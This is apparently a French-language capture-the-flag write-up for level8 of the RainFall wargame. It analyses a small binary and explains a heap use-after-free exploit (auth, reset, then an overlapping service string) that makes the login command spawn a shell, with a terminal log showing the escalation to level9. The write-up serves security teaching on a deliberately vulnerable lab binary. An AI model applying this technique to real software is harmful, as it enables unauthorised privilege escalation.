### Analyse

Le programme continient une boucle while 1, si on ne met rien, la boucle se termine. 
Il print l'adresse de auth et de service.
Il y a 4 options : 
`auth ` -> Alloue 4 bytes a la variable et verifie si la reste de l'input si la taille est inf a 32. 
`reset` -> free auth
`service` -> utilise `strdup` pour allouer la variable `service`
`login` -> verifie si auth et auth->auth sont alloues puis appelle system("/bin/bash"), sinon print "Password :".

### Exploit

Le but est d'override auth et de set auth->auth pour appeler /bin/bash.

1. On doit d'abord s'authentifier ex : on tape "auth 42".
   Cela va cree une addresse dans la heap.
2. On tape "reset" pour free l'addr dans la heap mais elle reste reutilisable.
3. On choisit son service ex : "service AAAAAAAAAAAAAAAAAAAA"
   Le programme va ecrire sur l'addr precedente(auth) 
   et sur l'addr adjacente(auth->auth) car on doit s'authentifier deux fois.
4. Ensuite on se log  ex : "login steve".
   
```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 42
0x804a008, (nil) 
reset
0x804a008, (nil) 
service aaaaaaaaaaaaaaaaaaaaa
0x804a008, 0x804a018 
login ambre
$ whoami
level9

```